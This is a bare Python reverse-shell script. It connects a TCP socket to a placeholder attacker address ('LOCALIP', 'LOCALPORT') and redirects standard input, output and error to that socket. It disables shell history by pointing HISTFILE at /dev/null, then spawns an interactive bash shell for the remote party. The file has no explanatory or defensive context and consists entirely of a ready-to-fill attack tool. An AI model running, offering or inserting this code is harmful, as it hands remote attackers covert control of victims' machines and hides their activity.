import os
import pty
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('LOCALIP', 'LOCALPORT'))

os.dup2(sock.fileno(), 0)
os.dup2(sock.fileno(), 1)
os.dup2(sock.fileno(), 2)

os.putenv('HISTFILE', '/dev/null')

pty.spawn('/bin/bash')
sock.close()
